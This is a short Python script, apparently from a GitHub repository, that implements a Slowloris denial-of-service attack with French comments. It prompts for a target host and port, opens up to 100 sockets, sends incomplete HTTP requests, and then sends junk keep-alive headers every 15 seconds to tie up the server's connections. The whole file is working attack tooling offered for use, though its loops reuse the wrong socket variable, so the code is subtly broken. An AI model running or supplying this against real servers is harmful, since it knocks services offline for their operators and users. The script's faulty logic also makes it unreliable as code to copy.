"""
==================================================
 SlowlorisPythonBasic By KyaEH
 V0.0.1
 Repo: https://github.com/kyaEH/SlowlorisPythonBasic
==================================================
"""

import os,sys,time,socket,random

def slowloris(target,port):
	list_of_sockets = []

	regular_headers = [
		"User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		"Accept-language: en-US,en,q=0.5",
		"Connection: keep-alive"
	]

	socket_count = 100
	print("Attacking {}:{} with {} packets".format(target,port,socket_count))

	print("Creating sockets...")			#On créer 100 sockets différentes pour créer des connexions différentes
	for i in range(socket_count):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(4)
			s.connect((target, port))
		except socket.error:
			break
		list_of_sockets.append(s)
	print("Setting up sockets...")
	for i in list_of_sockets:
		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))			#b'Sending: GET /?randint HTTP/1.1\r\n'  -> \r\n est la norme pour faire un retour à la ligne
		for header in regular_headers:
			s.send(bytes("{}\r\n".format(header).encode("utf-8")))			#Header user agent + Accept-language 			

	while True:
		print("Sending keep-alive!")
		for i in list_of_sockets:
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))			#b'sending: X-a: 439\r\n'	-> X- signifie en-tête non standart https://docs.oracle.com/en-us/iaas/Content/Balance/Reference/httpheaders.htm  
			except socket.error:
				print("error")
				raise

		time.sleep(15)


if __name__=="__main__": 
	try:
		target=input("target: ")
		port=int(input("port: "))
		slowloris(target,port)

	except KeyboardInterrupt:
		print('Interrupted')
		try:
			sys.exit(0)
		except SystemExit:
			os._exit(0)
